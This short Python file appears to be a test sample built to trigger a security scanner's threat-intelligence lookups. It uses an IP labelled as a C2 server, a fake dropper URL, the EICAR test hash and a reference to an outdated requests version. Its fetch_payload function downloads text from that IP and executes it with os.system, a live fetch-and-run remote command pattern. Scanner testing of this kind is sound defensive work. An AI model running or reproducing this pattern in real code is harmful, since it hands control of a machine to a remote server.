import os
import requests

# 1. Trigger AbuseIPDB: A known malicious botnet/C2 IP address 
# (This is a well-known test/scanner IP often flagged on AbuseIPDB)
C2_SERVER = "141.98.11.75" 

# 2. Trigger VirusTotal: A blatantly suspicious URL and a dummy file hash
DROPPER_URL = "http://malicious-payload-delivery.xyz/update.exe"
MALWARE_HASH = "44d88612fea8a8f36de82e1278abb02f" # Standard EICAR test hash

# 3. Trigger NVD (If your engine parses inline dependencies or comments)
# Dependency: requests==2.19.0 (Contains known High-severity CVEs)
def fetch_payload():
    response = requests.get(f"http://{C2_SERVER}/api/v1/command")
    os.system(response.text)
